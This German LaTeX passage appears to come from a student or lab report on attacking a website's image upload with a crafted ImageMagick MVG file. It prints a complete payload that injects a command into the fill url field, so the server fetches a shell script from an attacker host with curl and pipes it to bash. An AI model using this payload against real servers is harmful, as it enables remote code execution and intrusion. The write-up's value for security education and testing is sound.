\subsubsection{Generische angreifende MVG-Datei}

Der Angriffspunkt auf die Website besteht darin eine infizierte MVG-Datei analog zu den einfachen Beispielen oben hochzuladen und somit an Informationen über die Webserver zu kommen.\\

Da, in der MVG nur eine Zeile Platz ist den schädlichen Code zu platzieren, haben wir uns für einen generischen Code entschieden. Hier wird eine .sh-Datei von dem Server des Angreifers heruntergeladen und per Bash ausgeführt.

\begin{lstlisting}[language=MVG, caption=Aufbau generische angreifende MVG-Datei,label={lst:genericmvg}]
push graphic-context
viewbox 0 0 640 480
fill 'url(https://miro.medium.com/max/700/1*MI686k5sDQrISBM6L8pf5A.jpeg"|curl "http://192.168.16.125:8080/attack"| bash")'
pop graphic-context
\end{lstlisting}
\vspace{5mm}

Der Angreifer kann also auf seinem Server entscheiden, welcher Code ausgeführt wird und die Implementierung jederzeit erweitern.\\

Der Aufbau des Webservers des Angreifers wird im kommenden Absatz beschrieben.